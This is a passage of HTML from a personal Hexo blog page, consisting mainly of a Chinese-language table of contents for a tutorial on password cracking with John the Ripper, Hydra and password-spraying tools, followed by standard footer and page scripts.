toc-article-level-3"><a class="toc-article-link" href="#John-the-ripper%E6%B7%B7%E5%90%88%E6%94%BB%E6%93%8A"><span class="toc-article-text">John the ripper混合攻擊</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#KoreLogic"><span class="toc-article-text">KoreLogic</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E8%A6%8F%E5%89%87%E9%9B%86%E5%85%A7%E5%AE%B9%E7%B6%B2%E5%9D%80"><span class="toc-article-text">規則集內容網址</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E7%A4%BA%E7%AF%84-1"><span class="toc-article-text">示範</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%87%AA%E5%AE%9A%E7%BE%A9%E8%A6%8F%E5%89%87"><span class="toc-article-text">自定義規則</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%B0%8F%E8%A9%A6%E8%BA%AB%E6%89%8B-2"><span class="toc-article-text">小試身手</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%83%A8%E7%BD%B2%E8%99%9B%E6%93%AC%E6%A9%9F"><span class="toc-article-text">部署虛擬機</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%B7%9A%E4%B8%8A%E5%AF%86%E7%A2%BC%E6%94%BB%E6%93%8A"><span class="toc-article-text">線上密碼攻擊</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Hydra%E7%A0%B4%E8%A7%A3FTP"><span class="toc-article-text">Hydra破解FTP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#FTP%E7%B0%A1%E4%BB%8B"><span class="toc-article-text">FTP簡介</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#hydra%E7%A0%B4%E8%A7%A3FTP%E8%AA%9E%E6%B3%95"><span class="toc-article-text">hydra破解FTP語法</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Hydra%E7%A0%B4%E8%A7%A3SMTP%E4%BC%BA%E6%9C%8D%E5%99%A8"><span class="toc-article-text">Hydra破解SMTP伺服器</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#SMTP%E7%B0%A1%E4%BB%8B"><span class="toc-article-text">SMTP簡介</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Hydra%E7%A0%B4%E8%A7%A3SMTP%E4%BC%BA%E6%9C%8D%E5%99%A8%E8%AA%9E%E6%B3%95"><span class="toc-article-text">Hydra破解SMTP伺服器語法</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Hydra%E7%A0%B4%E8%A7%A3SSH%E8%AA%9E%E6%B3%95"><span class="toc-article-text">Hydra破解SSH語法</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#SSH%E7%B0%A1%E4%BB%8B"><span class="toc-article-text">SSH簡介</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Hydra%E7%A0%B4%E8%A7%A3SSH"><span class="toc-article-text">Hydra破解SSH</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Hydra%E7%A0%B4%E8%A7%A3HTTP%E7%99%BB%E9%99%B8%E9%A0%81%E9%9D%A2"><span class="toc-article-text">Hydra破解HTTP登陸頁面</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%A0%B4%E8%A7%A3%E5%89%8D%E7%BD%AE%E6%B5%81%E7%A8%8B"><span class="toc-article-text">破解前置流程</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Hydra%E7%A0%B4%E8%A7%A3HTTP%E7%99%BB%E9%99%B8%E9%A0%81%E9%9D%A2%E5%9F%BA%E6%9C%AC%E8%AA%9E%E6%B3%95"><span class="toc-article-text">Hydra破解HTTP登陸頁面基本語法</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%85%B6%E4%BB%96%E5%9C%A8%E7%B7%9A%E5%AF%86%E7%A2%BC%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7"><span class="toc-article-text">其他在線密碼破解工具</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%B0%8F%E8%A9%A6%E8%BA%AB%E6%89%8B-3"><span class="toc-article-text">小試身手</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E7%AC%AC%E4%B8%80%E9%A1%8C"><span class="toc-article-text">第一題</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E7%AC%AC%E4%BA%8C%E9%A1%8C"><span class="toc-article-text">第二題</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E7%AC%AC%E4%B8%89%E9%A1%8C"><span class="toc-article-text">第三題</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E7%AC%AC%E5%9B%9B%E9%A1%8C"><span class="toc-article-text">第四題</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AF%86%E7%A2%BC%E5%99%B4%E5%B0%84%E6%94%BB%E6%93%8A"><span class="toc-article-text">密碼噴射攻擊</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%B0%A1%E4%BB%8B-5"><span class="toc-article-text">簡介</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SSH%E5%AF%86%E7%A2%BC%E5%99%B4%E5%B0%84%E6%94%BB%E6%93%8A"><span class="toc-article-text">SSH密碼噴射攻擊</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#RDP%E5%AF%86%E7%A2%BC%E5%99%B4%E5%B0%84%E6%94%BB%E6%93%8A"><span class="toc-article-text">RDP密碼噴射攻擊</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#RDPassSpray"><span class="toc-article-text">RDPassSpray</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7"><span class="toc-article-text">其他工具</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B0%8F%E8%A9%A6%E8%BA%AB%E6%89%8B-4"><span class="toc-article-text">小試身手</span></a></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <!--
+<p>
+  
+  &copy; 2024 Zhi's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+//於底下添加沒用的版本訊息
+--->
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
